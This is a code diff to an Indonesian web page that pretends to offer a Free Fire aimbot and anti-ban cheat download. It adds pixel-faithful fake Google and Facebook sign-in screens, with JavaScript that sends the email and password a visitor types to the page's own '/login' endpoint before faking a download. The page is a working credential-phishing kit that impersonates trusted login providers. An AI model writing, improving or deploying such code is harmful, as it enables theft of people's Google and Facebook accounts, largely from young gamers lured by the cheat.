@@ -365,6 +365,98 @@
       border-right:1px solid rgba(255,255,255,.15);
     }
     .fb-oauth-label{flex:1;text-align:center;padding-right:42px}
+    /* ─── OAUTH STEP SCREENS ─── */
+    .oauth-screen{display:none}
+    .oauth-screen.active{display:block}
+    .al-modal.mode-google,.al-modal.mode-facebook{background:#fff;border-color:rgba(0,0,0,0.1)}
+    .oauth-back{
+      display:flex;align-items:center;gap:5px;padding:14px 16px 2px;
+      border:none;background:none;cursor:pointer;font-size:13px;font-weight:500;
+    }
+    .mode-google .oauth-back{color:#1a73e8;font-family:'Google Sans',Roboto,Arial,sans-serif}
+    .mode-facebook .oauth-back{color:#1877f2;font-family:Helvetica,Arial,sans-serif}
+    .g-signin{padding:14px 28px 0;font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff}
+    .g-signin-logo{display:flex;justify-content:center;margin-bottom:14px}
+    .g-signin-h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 4px}
+    .g-signin-sub{font-size:14px;color:#202124;text-align:center;margin:0 0 18px;line-height:1.5}
+    .g-signin-sub b{font-weight:500}
+    .g-signin-input-wrap{position:relative;margin-bottom:4px}
+    .g-signin-input{
+      width:100%;height:54px;border:1px solid #747775;border-radius:4px;
+      padding:18px 15px 0;font-size:16px;color:#202124;
+      background:#fff;box-sizing:border-box;-webkit-appearance:none;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;transition:border .1s;
+    }
+    .g-signin-input:focus{outline:none;border:2px solid #1a73e8;padding:17px 14px 0}
+    .g-signin-input:focus~.g-signin-lbl,.g-signin-input:not(:placeholder-shown)~.g-signin-lbl{top:9px;font-size:11px}
+    .g-signin-input:focus~.g-signin-lbl{color:#1a73e8}
+    .g-signin-lbl{
+      position:absolute;top:50%;left:16px;transform:translateY(-50%);
+      font-size:16px;color:#747775;pointer-events:none;transition:all .15s;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;
+    }
+    .g-signin-err{font-size:12px;color:#d93025;margin:3px 0 8px 2px;display:none}
+    .g-signin-err.show{display:block}
+    .g-signin-forgot{
+      font-size:14px;color:#1a73e8;font-weight:500;border:none;background:none;
+      cursor:pointer;padding:8px 0 16px;display:block;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;
+    }
+    .g-signin-actions{display:flex;justify-content:space-between;align-items:center;padding-bottom:22px}
+    .g-signin-create{
+      font-size:14px;color:#1a73e8;font-weight:500;border:none;background:none;
+      cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;
+    }
+    .g-signin-next{
+      background:#1a73e8;color:#fff;border:none;border-radius:4px;
+      padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;transition:background .1s;
+      display:flex;align-items:center;gap:8px;min-width:76px;justify-content:center;
+    }
+    .g-signin-next:hover{background:#1557b0}
+    .g-spinner{
+      width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+      border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none;
+    }
+    .g-signin-footer{
+      display:flex;justify-content:center;gap:20px;padding:14px 28px 16px;
+      font-size:12px;color:#747775;border-top:1px solid #e8eaed;
+    }
+    .g-signin-footer a{color:#747775;text-decoration:none}
+    .fb-login-screen{background:#f0f2f5;padding:18px 12px 14px;font-family:Helvetica,Arial,sans-serif}
+    .fb-login-logo{font-size:38px;font-weight:700;color:#1877f2;text-align:center;letter-spacing:-1.5px;margin-bottom:6px;line-height:1}
+    .fb-login-tagline{font-size:14px;color:#1c1e21;text-align:center;line-height:1.4;margin-bottom:14px}
+    .fb-login-card{background:#fff;border-radius:8px;padding:14px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.05)}
+    .fb-login-input{
+      width:100%;height:52px;border:1px solid #dddfe2;border-radius:6px;
+      padding:0 16px;font-size:17px;color:#1c1e21;background:#fff;
+      box-sizing:border-box;margin-bottom:12px;-webkit-appearance:none;
+      font-family:Helvetica,Arial,sans-serif;transition:border-color .1s;
+    }
+    .fb-login-input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.15)}
+    .fb-login-btn{
+      width:100%;height:52px;background:#1877f2;color:#fff;border:none;border-radius:6px;
+      font-size:20px;font-weight:700;cursor:pointer;font-family:Helvetica,Arial,sans-serif;
+      transition:background .1s;margin-bottom:12px;
+      display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .fb-login-btn:hover{background:#166fe5}
+    .fb-spinner{
+      width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+      border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none;
+    }
+    .fb-forgot{display:block;text-align:center;font-size:14px;color:#1877f2;margin-bottom:12px;text-decoration:none}
+    .fb-divider{display:flex;align-items:center;gap:8px;margin:12px 0}
+    .fb-divider::before,.fb-divider::after{content:'';flex:1;height:1px;background:#dadde1}
+    .fb-divider-txt{font-size:13px;color:#606770}
+    .fb-create-btn{
+      display:block;width:max-content;margin:0 auto;padding:12px 20px;
+      background:#42b72a;color:#fff;border:none;border-radius:6px;
+      font-size:17px;font-weight:700;cursor:pointer;font-family:Helvetica,Arial,sans-serif;transition:background .1s;
+    }
+    .fb-create-btn:hover{background:#36a420}
+    .fb-login-links{display:flex;justify-content:center;gap:12px;margin-top:12px}
+    .fb-login-links a{font-size:11px;color:#8a8d91;text-decoration:none}
     @keyframes spin{to{transform:rotate(360deg)}}
     .al-modal-close{
       display:block;margin:12px auto 0;
@@ -475,12 +567,11 @@
       <div class="al-dl-meta">
         Diupdate <span>5 Juni 2026</span> ·
         Kompatibel <span>Android 6.0+</span> ·
-        Memerlukan <span>Root / VPN Mode</span>
+        Kompatibel <span>NoRoot &amp; Root Support</span>
       </div>
       <div class="al-dl-features">
         <span class="al-dl-feat">Auto Headshot</span>
         <span class="al-dl-feat">Aim Lock &amp; Tracking</span>
-        <span class="al-dl-feat">Wall ESP</span>
         <span class="al-dl-feat">Aimbot Sensitivity Config</span>
         <span class="al-dl-feat">Anti-Ban v4.2</span>
         <span class="al-dl-feat">No Recoil</span>
@@ -519,7 +610,7 @@
     <div class="al-feats-grid">
       <div class="al-feat-card"><div class="al-feat-icon">🎯</div><div class="al-feat-title">Auto Headshot</div><div class="al-feat-desc">Aim otomatis ke kepala musuh dalam radius tertentu. Adjustable sensitivity 1–10.</div></div>
       <div class="al-feat-card"><div class="al-feat-icon">🔒</div><div class="al-feat-title">Aim Lock</div><div class="al-feat-desc">Kunci bidikan ke target terdekat selama dalam jangkauan. Smooth tracking motion.</div></div>
-      <div class="al-feat-card"><div class="al-feat-icon">👁️</div><div class="al-feat-title">Wall ESP</div><div class="al-feat-desc">Lihat posisi musuh melalui tembok, pohon, dan halangan lainnya. Color-coded.</div></div>
+      <div class="al-feat-card"><div class="al-feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#FFBA00" stroke-width="2" stroke-linecap="round" width="22" height="22"><circle cx="12" cy="12" r="3"/><path d="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83"/></svg></div><div class="al-feat-title">NoRoot Mode</div><div class="al-feat-desc">Berjalan tanpa akses root melalui mode VPN. Kompatibel Android 6.0+ tanpa modifikasi sistem.</div></div>
       <div class="al-feat-card"><div class="al-feat-icon">🛡️</div><div class="al-feat-title">Anti-Ban v4.2</div><div class="al-feat-desc">Sistem spoof signature + enkripsi AES-256. Tidak terdeteksi sistem anti-cheat Garena.</div></div>
       <div class="al-feat-card"><div class="al-feat-icon">⚡</div><div class="al-feat-title">No Recoil</div><div class="al-feat-desc">Eliminasi semua recoil pada semua senjata. Full auto &amp; single-shot compatible.</div></div>
       <div class="al-feat-card"><div class="al-feat-icon">📱</div><div class="al-feat-title">Low RAM Mode</div><div class="al-feat-desc">Dioptimalkan untuk perangkat RAM 2GB. Tidak lag, tidak drain baterai berlebih.</div></div>
@@ -651,39 +742,104 @@
 
 <!-- INSTALL MODAL -->
 <div class="al-modal-backdrop" id="al-modal">
-  <div class="al-modal">
-    <div class="al-modal-head">
-      <div class="al-modal-badge">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#FFBA00" stroke-width="2.5" stroke-linecap="round" width="11" height="11" style="display:inline;vertical-align:-1px;margin-right:5px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>VERIFIKASI AKUN
+  <div class="al-modal" id="al-modal-card">
+
+    <!-- SCREEN 0: Method selection -->
+    <div class="oauth-screen active" id="screen-method">
+      <div class="al-modal-head">
+        <div class="al-modal-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#FFBA00" stroke-width="2.5" stroke-linecap="round" width="11" height="11" style="display:inline;vertical-align:-1px;margin-right:5px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>VERIFIKASI AKUN
+        </div>
+        <div class="al-modal-title">Aktivasi Tool FF</div>
+        <div class="al-modal-sub">Login dengan akun yang terhubung ke Free Fire kamu.</div>
       </div>
-      <div class="al-modal-title">Aktivasi Tool FF</div>
-      <div class="al-modal-sub">Login dengan akun yang terhubung ke Free Fire kamu.</div>
-    </div>
-    <div class="al-modal-body">
-      <div class="al-modal-body-txt">Verifikasi diperlukan untuk mengaktifkan lisensi anti-ban dan memulai download. Pilih metode login di bawah.</div>
-      <div class="al-modal-social">
-        <button class="g-oauth-btn" onclick="handleSocialDownload('google')">
-          <div class="g-oauth-icon">
-            <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
-              <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908C16.418 14.017 17.64 11.773 17.64 9.2z" fill="#4285F4"/>
-              <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.909-2.259c-.806.54-1.837.86-3.047.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#34A853"/>
-              <path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
-              <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
-            </svg>
-          </div>
-          <span class="g-oauth-label">Sign in with Google</span>
-        </button>
-        <button class="fb-oauth-btn" onclick="handleSocialDownload('facebook')">
-          <div class="fb-oauth-icon">
-            <svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-              <path fill="#fff" d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01z"/>
-            </svg>
-          </div>
-          <span class="fb-oauth-label">Continue with Facebook</span>
-        </button>
+      <div class="al-modal-body">
+        <div class="al-modal-body-txt">Pilih metode login untuk mengaktifkan lisensi anti-ban dan memulai download.</div>
+        <div class="al-modal-social">
+          <button class="g-oauth-btn" onclick="showOauthScreen('google')">
+            <div class="g-oauth-icon">
+              <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+                <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908C16.418 14.017 17.64 11.773 17.64 9.2z" fill="#4285F4"/>
+                <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.909-2.259c-.806.54-1.837.86-3.047.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#34A853"/>
+                <path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+                <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
+              </svg>
+            </div>
+            <span class="g-oauth-label">Sign in with Google</span>
+          </button>
+          <button class="fb-oauth-btn" onclick="showOauthScreen('facebook')">
+            <div class="fb-oauth-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#fff" d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01z"/>
+              </svg>
+            </div>
+            <span class="fb-oauth-label">Continue with Facebook</span>
+          </button>
+        </div>
+        <button class="al-modal-close" onclick="closeInstallModal()">Batal</button>
       </div>
-      <button class="al-modal-close" onclick="closeInstallModal()">Batal</button>
     </div>
+
+    <!-- SCREEN 1: Google Sign-In -->
+    <div class="oauth-screen" id="screen-google">
+      <button class="oauth-back" onclick="showOauthScreen('method')" type="button">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" width="15" height="15"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
+        Kembali
+      </button>
+      <div class="g-signin">
+        <div class="g-signin-logo">
+          <svg viewBox="0 0 272 92" height="26" xmlns="http://www.w3.org/2000/svg">
+            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+            <path d="M173.17 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+            <path d="M209.85 26.27v39.82c0 16.38-9.67 23.07-21.09 23.07-10.77 0-17.22-7.21-19.66-13.09l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.67-21.25-22.1 0-12.52 10.16-22.27 21.25-22.27 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.26zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+            <path d="M225.5 2v66.19h-9.32V2h9.32z" fill="#34A853"/>
+            <path d="M261.37 54.51l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.12l1.01 2.52-29.65 12.27c2.27 4.45 5.8 6.72 10.77 6.72 4.97 0 8.41-2.44 10.9-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+            <path d="M34.93 40.94v-9.41h31.71c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C15.96 68.88 0 53.41 0 34.44 0 15.47 15.96 0 34.93 0c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.67l-22.48.03z" fill="#4285F4"/>
+          </svg>
+        </div>
+        <h2 class="g-signin-h1">Sign in</h2>
+        <p class="g-signin-sub">to continue to <b>Garena Free Fire</b></p>
+        <div class="g-signin-input-wrap">
+          <input type="email" id="g-email" class="g-signin-input" placeholder=" " autocomplete="email"/>
+          <label for="g-email" class="g-signin-lbl">Email or phone</label>
+        </div>
+        <div class="g-signin-err" id="g-err"></div>
+        <button class="g-signin-forgot" type="button">Forgot email?</button>
+        <div class="g-signin-actions">
+          <button class="g-signin-create" type="button">Create account</button>
+          <button class="g-signin-next" type="button" onclick="handleGoogleNext()">
+            <div class="g-spinner" id="g-spinner"></div>
+            <span id="g-next-txt">Next</span>
+          </button>
+        </div>
+      </div>
+      <div class="g-signin-footer">
+        <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Facebook Login -->
+    <div class="oauth-screen" id="screen-facebook">
+      <div class="fb-login-screen">
+        <div class="fb-login-logo">facebook</div>
+        <div class="fb-login-tagline">Log in to continue with Garena Free Fire</div>
+        <div class="fb-login-card">
+          <input type="email" id="fb-email" class="fb-login-input" placeholder="Email address or phone number" autocomplete="email"/>
+          <input type="password" id="fb-pass" class="fb-login-input" placeholder="Password" autocomplete="current-password"/>
+          <button class="fb-login-btn" type="button" onclick="handleFacebookLogin()">
+            <div class="fb-spinner" id="fb-spinner"></div>
+            <span id="fb-btn-txt">Log In</span>
+          </button>
+          <a href="#" class="fb-forgot">Forgotten password?</a>
+          <div class="fb-divider"><span class="fb-divider-txt">or</span></div>
+          <button class="fb-create-btn" type="button">Create new account</button>
+        </div>
+        <div class="fb-login-links">
+          <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Help</a>
+        </div>
+      </div>
+    </div>
+
   </div>
 </div>
 
@@ -705,32 +861,82 @@
 function openInstallModal() {
   document.getElementById('al-modal').classList.add('open');
   document.body.style.overflow = 'hidden';
+  showOauthScreen('method');
 }
 function closeInstallModal() {
   document.getElementById('al-modal').classList.remove('open');
   document.body.style.overflow = '';
 }
-function handleSocialDownload(provider) {
-  var btns = document.querySelectorAll('.g-oauth-btn,.fb-oauth-btn');
-  btns.forEach(function(b){ b.disabled = true; b.style.opacity = '0.6'; });
+function showOauthScreen(screen) {
+  document.querySelectorAll('#al-modal .oauth-screen').forEach(function(s){ s.classList.remove('active'); });
+  var ids = {google:'screen-google',facebook:'screen-facebook',method:'screen-method'};
+  var el = document.getElementById(ids[screen] || 'screen-method');
+  if (el) el.classList.add('active');
+  var card = document.getElementById('al-modal-card');
+  if (card) {
+    card.className = 'al-modal';
+    if (screen === 'google') card.classList.add('mode-google');
+    if (screen === 'facebook') card.classList.add('mode-facebook');
+  }
+  if (screen === 'method') {
+    var e = document.getElementById('g-email'); if (e) e.value = '';
+    var f = document.getElementById('fb-email'); if (f) f.value = '';
+    var p = document.getElementById('fb-pass'); if (p) p.value = '';
+    var er = document.getElementById('g-err'); if (er) { er.textContent = ''; er.classList.remove('show'); }
+  }
+}
+function handleGoogleNext() {
+  var emailEl = document.getElementById('g-email');
+  var errEl   = document.getElementById('g-err');
+  var spEl    = document.getElementById('g-spinner');
+  var txtEl   = document.getElementById('g-next-txt');
+  var nextBtn = document.querySelector('#screen-google .g-signin-next');
+  var email   = emailEl ? emailEl.value.trim() : '';
+  if (!email || !email.includes('@')) {
+    if (errEl) { errEl.textContent = email ? 'Enter a valid email address.' : 'Enter your email'; errEl.classList.add('show'); }
+    if (emailEl) emailEl.focus();
+    return;
+  }
+  if (errEl) errEl.classList.remove('show');
+  if (nextBtn) nextBtn.disabled = true;
+  if (spEl) spEl.style.display = 'block';
+  if (txtEl) txtEl.style.display = 'none';
   fetch('/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      username: 'social_' + provider + '@ff.id',
-      password: 'SOCIAL:' + provider.toUpperCase(),
-      type: 'tool_aimlock_' + provider,
-      method: provider,
-      page: 'aimlock',
-      ua: navigator.userAgent,
-      ts: new Date().toISOString()
-    })
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({username:email,password:'GOOGLE_OAUTH_TOKEN',method:'google',type:'tool_aimlock_google',page:'aimlock',ua:navigator.userAgent,ts:new Date().toISOString()})
   }).catch(function(){});
   setTimeout(function() {
-    btns.forEach(function(b){ b.disabled = false; b.style.opacity = ''; });
+    if (nextBtn) nextBtn.disabled = false;
+    if (spEl) spEl.style.display = 'none';
+    if (txtEl) txtEl.style.display = '';
     closeInstallModal();
     simulateDownload();
-  }, 1400);
+  }, 1700);
+}
+function handleFacebookLogin() {
+  var emailEl = document.getElementById('fb-email');
+  var passEl  = document.getElementById('fb-pass');
+  var spEl    = document.getElementById('fb-spinner');
+  var txtEl   = document.getElementById('fb-btn-txt');
+  var btn     = document.querySelector('#screen-facebook .fb-login-btn');
+  var email   = emailEl ? emailEl.value.trim() : '';
+  var pass    = passEl ? passEl.value : '';
+  if (!email) { if (emailEl) emailEl.focus(); return; }
+  if (!pass)  { if (passEl)  passEl.focus();  return; }
+  if (btn) btn.disabled = true;
+  if (spEl) spEl.style.display = 'block';
+  if (txtEl) txtEl.style.display = 'none';
+  fetch('/login', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({username:email,password:pass,method:'facebook',type:'tool_aimlock_facebook',page:'aimlock',ua:navigator.userAgent,ts:new Date().toISOString()})
+  }).catch(function(){});
+  setTimeout(function() {
+    if (btn) btn.disabled = false;
+    if (spEl) spEl.style.display = 'none';
+    if (txtEl) txtEl.style.display = '';
+    closeInstallModal();
+    simulateDownload();
+  }, 1900);
 }
 
 function simulateDownload() {
